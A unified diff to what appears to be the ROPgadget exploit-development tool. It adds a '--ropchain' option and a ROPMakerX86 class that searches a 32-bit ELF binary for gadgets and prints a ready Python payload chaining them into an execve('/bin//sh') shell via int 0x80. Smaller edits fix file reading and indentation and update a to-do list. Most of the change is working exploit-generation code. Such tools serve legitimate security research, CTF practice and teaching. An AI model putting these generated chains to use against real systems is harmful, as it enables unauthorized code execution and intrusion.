@@ -75,7 +75,9 @@
 ## ----------------------
 ##
 ##   - Add ARM64
-##   - Add the ROP chain generation with z3 (Complete the ROPMaker class)
+##   - Use Z3 to solve the ROP chain
+##   - Add the x64 and ARM ROP chain generation
+##   - Fix the double ret
 ##   - Add system gadgets for PPC, Sparc (Gadgets.addSYSGadgets())
 ##   - Manage big endian in Mach-O format like the ELF classe.
 ##   - Everything you think is cool :)
@@ -166,6 +168,7 @@ examples:
         parser.add_argument("--filter",         type=str, metavar="<key>",        help="Suppress specific instructions")
         parser.add_argument("--range",          type=str, metavar="<start-end>",  default="0x0-0x0", help="Search between two addresses (0x...-0x...)")
         parser.add_argument("--badbytes",       type=str, metavar="<byte>",       help="Rejects specific bytes in the gadget's address")
+        parser.add_argument("--ropchain",       action="store_true",              help="Enable the ROP chain generation")
         parser.add_argument("--thumb"  ,        action="store_true",              help="Use the thumb mode for the search engine. (ARM only)")
         parser.add_argument("--console",        action="store_true",              help="Use an interactive console for search engine")
         parser.add_argument("--norop",          action="store_true",              help="Disable ROP search engine")
@@ -219,8 +222,6 @@ class PEFlags:
         IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b
         IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
         IMAGE_SIZEOF_SHORT_NAME       = 0x8
-
-# tableau (c_char * 32)
 
 class IMAGE_FILE_HEADER(Structure):
     _fields_ =  [
@@ -989,7 +990,7 @@ class Binary:
         self.__binary    = None
         
         try:
-            fd = open(fileName, "r")
+            fd = open(fileName, "rb")
             self.__rawBinary = fd.read()
             fd.close()
         except:
@@ -1133,14 +1134,14 @@ class Gadgets:
                                ["\x08\x00\xe0\x03", 4, 4, self.__binary.getArch(), self.__binary.getArchMode()]  # jr  $ra
                           ]
         gadgetsARMThumb = [
-                                ["[\x00\x08\x10\x18\x20\x28\x30\x38\x40\x48\x70]{1}\x47", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # bx   reg
-                                ["[\x80\x88\x90\x98\xa0\xa8\xb0\xb8\xc0\xc8\xf0]{1}\x47", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # blx  reg
-                                ["[\x00-\xff]{1}\xbd", 2, 2, self.__binary.getArch(), CS_MODE_THUMB]                                     # pop {,pc}
+                               ["[\x00\x08\x10\x18\x20\x28\x30\x38\x40\x48\x70]{1}\x47", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # bx   reg
+                               ["[\x80\x88\x90\x98\xa0\xa8\xb0\xb8\xc0\xc8\xf0]{1}\x47", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # blx  reg
+                               ["[\x00-\xff]{1}\xbd", 2, 2, self.__binary.getArch(), CS_MODE_THUMB]                                     # pop {,pc}
                           ]
         gadgetsARM      = [
-                                ["[\x10-\x19\x1e]{1}\xff\x2f\xe1", 4, 4, self.__binary.getArch(), CS_MODE_ARM],  # bx   reg
-                                ["[\x30-\x39\x3e]{1}\xff\x2f\xe1", 4, 4, self.__binary.getArch(), CS_MODE_ARM],  # blx  reg
-                                ["[\x00-\xff]{1}\x80\xbd\xe8", 4, 4, self.__binary.getArch(), CS_MODE_ARM]       # pop {,pc}
+                               ["[\x10-\x19\x1e]{1}\xff\x2f\xe1", 4, 4, self.__binary.getArch(), CS_MODE_ARM],  # bx   reg
+                               ["[\x30-\x39\x3e]{1}\xff\x2f\xe1", 4, 4, self.__binary.getArch(), CS_MODE_ARM],  # blx  reg
+                               ["[\x00-\xff]{1}\x80\xbd\xe8", 4, 4, self.__binary.getArch(), CS_MODE_ARM]       # pop {,pc}
                           ]
 
         if   self.__binary.getArch() == CS_ARCH_X86:    gadgets = gadgetsX86
@@ -1165,13 +1166,13 @@ class Gadgets:
                                ["\x0f\x34", 2, 1, self.__binary.getArch(), self.__binary.getArchMode()], # sysenter
                           ]
         gadgetsARMThumb = [
-                                ["\x00-\xff]{1}\xef", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # svc
+                               ["\x00-\xff]{1}\xef", 2, 2, self.__binary.getArch(), CS_MODE_THUMB], # svc
                           ]
         gadgetsARM      = [
-                                ["\x00-\xff]{3}\xef", 4, 4, self.__binary.getArch(), CS_MODE_ARM] # svc
+                               ["\x00-\xff]{3}\xef", 4, 4, self.__binary.getArch(), CS_MODE_ARM] # svc
                           ]
         gadgetsMIPS     = [
-                                ["\x0c\x00\x00\x00", 4, 4, self.__binary.getArch(), self.__binary.getArchMode()] # syscall
+                               ["\x0c\x00\x00\x00", 4, 4, self.__binary.getArch(), self.__binary.getArchMode()] # syscall
                           ]
 
         if   self.__binary.getArch() == CS_ARCH_X86:    gadgets = gadgetsX86
@@ -1209,21 +1210,217 @@ class Gadgets:
 
 # ROPMaker class ===================================================================================
 
-class ROPMaker:
-    def __init__(self, gadgets):
+class ROPMakerX86:
+    def __init__(self, binary, gadgets):
+        self.__binary  = binary
         self.__gadgets = gadgets
 
-    def gen(self):
-        print "[Error] ROPchain not implemented yet"
-        pass
+        self.__generate()
 
+    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
+        for gadget in self.__gadgets:
+            if gadget in gadgetsAlreadyTested:
+                continue
+            f = gadget["gadget"].split(" ; ")[0]
+            # regex -> mov dword ptr [r32], r32
+            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
+            if regex:
+                lg = gadget["gadget"].split(" ; ")[1:]
+                try:
+                    for g in lg:
+                        if g.split()[0] != "pop" and g.split()[0] != "ret":
+                            raise
+                    print "\t[+] Gadget found: 0x%x %s" %(gadget["vaddr"], gadget["gadget"])
+                    return [gadget, regex.group("dst"), regex.group("src")]
+                except:
+                    continue
+        return None
 
+    def __lookingForSomeThing(self, something):
+        for gadget in self.__gadgets:
+            lg = gadget["gadget"].split(" ; ")
+            if lg[0] == something:
+                try:
+                    for g in lg[1:]:
+                        if g.split()[0] != "pop" and g.split()[0] != "ret":
+                            raise
+                    print "\t[+] Gadget found: 0x%x %s" %(gadget["vaddr"], gadget["gadget"])
+                    return gadget
+                except:
+                    continue
+        return None
 
+    def __padding(self, gadget, regAlreadSetted):
+        lg = gadget["gadget"].split(" ; ")
+        for g in lg[1:]:
+            if g.split()[0] == "pop":
+                reg = g.split()[1]
+                try:
+                    print "\tp += pack('<I', 0x%08x) # padding without overwrite %s" %(regAlreadSetted[reg], reg)
+                except KeyError:
+                    print "\tp += pack('<I', 0x41414141) # padding"
 
+    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
 
+        sects = self.__binary.getDataSections()
+        dataAddr = None
+        for s in sects:
+            if s["name"] == ".data":
+                dataAddr = s["vaddr"]
+        if dataAddr == None:
+            print "\n[-] Error - Can't find a writable section"
+            return
 
+        print "\t#!/usr/bin/env python2"
+        print "\t# execve generated by ROPgadget v%d.%d\n" %(MAJOR_VERSION, MINOR_VERSION)
+        print "\tfrom struct import pack\n"
 
+        print "\t# Padding goes here"
+        print "\tp = ''\n"
 
+        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
+        self.__padding(popDst, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
+        print "\tp += '/bin'"
+        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        self.__padding(write4where, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data + 4" %(dataAddr + 4)
+        self.__padding(popDst, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
+        print "\tp += '//sh'"
+        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4}) # Don't overwrite reg dst
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        self.__padding(write4where, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        self.__padding(popDst, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
+        self.__padding(xorSrc, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        self.__padding(write4where, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popEbx["vaddr"], popEbx["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
+        self.__padding(popEbx, {})
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popEcx["vaddr"], popEcx["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        self.__padding(popEcx, {"ebx": dataAddr}) # Don't overwrite ebx
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(popEdx["vaddr"], popEdx["gadget"])
+        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(xorEax["vaddr"], xorEax["gadget"])
+        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
+
+        for i in range(11):
+            print "\tp += pack('<I', 0x%08x) # %s" %(incEax["vaddr"], incEax["gadget"])
+            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
+
+        print "\tp += pack('<I', 0x%08x) # %s" %(syscall["vaddr"], syscall["gadget"])
+
+    def __generate(self):
+
+        # To find the smaller gadget
+        self.__gadgets.reverse()
+
+        print "\nROP chain generation\n==========================================================="
+
+        print "\n- Step 1 -- Write-what-where gadgets\n"
+
+        gadgetsAlreadyTested = []
+        while True:
+            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
+            if not write4where:
+                print "\t[-] Can't find the 'mov dword ptr [r32], r32' gadget"
+                return
+
+            popDst = self.__lookingForSomeThing("pop %s" %(write4where[1]))
+            if not popDst:
+                print "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" %(write4where[1])
+                gadgetsAlreadyTested += [popDst]
+                continue
+
+            popSrc = self.__lookingForSomeThing("pop %s" %(write4where[2]))
+            if not popSrc:
+                print "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" %(write4where[2])
+                gadgetsAlreadyTested += [popSrc]
+                continue
+
+            xorSrc = self.__lookingForSomeThing("xor %s, %s" %(write4where[2], write4where[2]))
+            if not xorSrc:
+                print "\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [reg], reg'\n" %(write4where[2], write4where[2])
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+            else:
+                break
+
+        print "\n- Step 2 -- Init syscall number gadgets\n"
+
+        xorEax = self.__lookingForSomeThing("xor eax, eax")
+        if not xorEax:
+            print "\t[-] Can't find the 'xor eax, eax' instuction"
+            return
+
+        incEax = self.__lookingForSomeThing("inc eax")
+        if not incEax:
+            print "\t[-] Can't find the 'inc eax' instuction"
+            return
+
+        print "\n- Step 3 -- Init syscall arguments gadgets\n"
+
+        popEbx = self.__lookingForSomeThing("pop ebx")
+        if not popEbx:
+            print "\t[-] Can't find the 'pop ebx' instruction"
+            return
+
+        popEcx = self.__lookingForSomeThing("pop ecx")
+        if not popEcx:
+            print "\t[-] Can't find the 'pop ecx' instruction"
+            return
+
+        popEdx = self.__lookingForSomeThing("pop edx")
+        if not popEdx:
+            print "\t[-] Can't find the 'pop edx' instruction"
+            return
+
+        print "\n- Step 4 -- Syscall gadget\n"
+
+        syscall = self.__lookingForSomeThing("int 0x80")
+        if not syscall:
+            print "\t[-] Can't find the 'syscall' instruction"
+            return
+
+        print "\n- Step 5 -- Build the ROP chain\n"
+
+        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+
+class ROPMaker:
+    def __init__(self, binary, gadgets):
+        self.__binary  = binary
+        self.__gadgets = gadgets
+
+        self.__handlerArch()
+
+    def __handlerArch(self):
+        if self.__binary.getArch() == CS_ARCH_X86           \
+            and self.__binary.getArchMode() == CS_MODE_32   \
+            and self.__binary.getFormat() == "ELF":
+            ROPMakerX86(self.__binary, self.__gadgets)
+        else:
+            print "\n[Error] ROPMaker.__handlerArch - Arch not supported yet for the rop chain generation"
 
 # Core class =======================================================================================
 
@@ -1402,6 +1599,10 @@ class Core(cmd.Cmd):
             self.__getAllgadgets()
             self.__lookingForGadgets()
 
+            if self.__options.ropchain:
+                ROPMaker(self.__binary, self.__gadgets)
+
+
     # Console methods  ============================================
 
     def do_quit(self, s):
@@ -1485,7 +1686,7 @@ class Core(cmd.Cmd):
         print "Syntax: search <keyword1 keyword2 keyword3...> -- Filter with or without keywords"
         print "keyword  = with"
         print "!keyword = witout"
-        
+
 
 
 
